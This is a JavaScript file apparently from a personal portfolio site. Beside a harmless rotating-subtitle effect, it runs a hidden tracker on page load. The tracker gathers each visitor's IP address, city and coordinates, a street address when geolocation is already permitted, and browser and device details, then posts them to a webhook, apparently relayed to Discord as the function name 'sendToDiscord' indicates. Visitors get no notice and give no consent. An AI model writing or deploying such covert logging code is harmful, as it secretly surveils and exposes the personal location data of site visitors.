function sendToDiscord(ipData, locationData, deviceData) {
  const ip = ipData.ip;
  const city = ipData.city;
  const region = ipData.region;
  const country = ipData.country_name;
  const longitude = ipData.longitude;
  const latitude = ipData.latitude;

  let locationMessage = `Latitude: ${latitude} | Longitude: ${longitude}`;
  let addressMessage = "";

  if (locationData) {
    const { lat, lon, address } = locationData;
    locationMessage = `Latitude: ${lat} | Longitude: ${lon}`;
    addressMessage = `Address: ${address}`;
  }

  // Device information
  const deviceMessage = `
Device Information:
- Browser: ${deviceData.browser}
- OS: ${deviceData.os}
- Device: ${deviceData.device}
- Type: ${deviceData.type}
`;

  const message = `\`\`\`
IP Address: ${ip}
Location: ${city}, ${region}, ${country}
${locationMessage}
${addressMessage}
${deviceMessage}
\`\`\``;

  fetch("/api/webhook", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      ip,
      city,
      region,
      country,
      locationMessage,
      addressMessage,
      deviceMessage,
    }),
  });
}

function getUserLocation(callback) {
  navigator.permissions
    .query({ name: "geolocation" })
    .then(function (permissionStatus) {
      if (permissionStatus.state === "granted") {
        navigator.geolocation.getCurrentPosition(
          function (position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // Fetch address data from OpenStreetMap Nominatim API
            fetch(
              `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`
            )
              .then((response) => response.json())
              .then((data) => {
                const address = `${data.address.road || ""}, ${
                  data.address.city || ""
                }, ${data.address.state || ""}, ${data.address.country || ""}`;
                callback({ lat, lon, address });
              })
              .catch(() => callback(null));
          },
          () => callback(null)
        );
      } else {
        callback(null);
      }
    })
    .catch(() => callback(null));
}

function sendIPData() {
  fetch("https://ipapi.co/json")
    .then((response) => {
      if (!response.ok) {
        throw new Error(`IP API error: ${response.statusText}`);
      }
      return response.json();
    })
    .then((ipData) => {
      getUserLocation(function (locationData) {
        const deviceData = getDeviceData();
        console.log("Device Data:", deviceData);
        sendToDiscord(ipData, locationData, deviceData);
      });
    })
    .catch((error) => {
      console.error(`Error retrieving IP data: ${error}`);
    });
}

function getDeviceData() {
  // Initialize the parser
  var parser = new UAParser();
  var result = parser.getResult();

  // Prepare the device data to send
  return {
    browser: result.browser.name + " " + result.browser.version,
    os: result.os.name + " " + result.os.version,
    device: result.device.vendor + " " + result.device.model,
    type: result.device.type,
  };
}

window.addEventListener("load", sendIPData);

document.addEventListener("DOMContentLoaded", function () {
  const subtitles = [
    "Computer Programming & Information Systems Major",
    "Aspiring Software Engineer",
    "Photographer",
    "Programming Intern",
    "Slight Egomaniac",
  ];

  const subtitleElement = document.querySelector(".subtitle");

  function getRandomSubtitle(exclude) {
    let newSubtitle;
    do {
      newSubtitle = subtitles[Math.floor(Math.random() * subtitles.length)];
    } while (newSubtitle === exclude);
    return newSubtitle;
  }

  function changeSubtitle() {
    subtitleElement.classList.add("fade-out");

    setTimeout(() => {
      subtitleElement.textContent = getRandomSubtitle(
        subtitleElement.textContent
      );
      subtitleElement.classList.remove("fade-out");
    }, 1500); // Wait for fade-out before changing text
  }

  // Set random initial subtitle
  subtitleElement.textContent = getRandomSubtitle(null);

  // Change subtitle every 6 seconds
  setInterval(changeSubtitle, 6000);
});
